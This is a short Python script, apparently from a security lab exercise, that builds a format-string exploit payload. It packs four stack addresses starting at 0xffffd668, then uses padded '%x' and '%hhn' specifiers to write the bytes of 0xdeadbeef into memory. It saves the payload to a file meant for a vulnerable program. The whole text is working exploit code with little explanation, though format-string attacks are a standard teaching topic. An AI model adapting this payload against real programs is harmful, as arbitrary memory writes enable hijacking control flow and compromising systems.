#!/usr/bin/python3
import sys

addr = 0xffffd668
payload =  (addr + 3).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr + 2).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr + 1).to_bytes(4, byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4, byteorder='little')

# 154 = 0xde - 28 - 8 * 5
# 207 = 0x1ad - 0xde
# 17 = 0x1be - 0x1ad
# 49 = 0x1ef - 0x1be
s = "%.8x" * 5 + "%.154x" + "%hhn" + "%.207x" + "%hhn" + "%.17x" + "%hhn" + "%.49x" + "%hhn"
payload += s.encode('latin-1')

with open("badfile_prog1_2_4", "wb") as f:
    f.write(payload)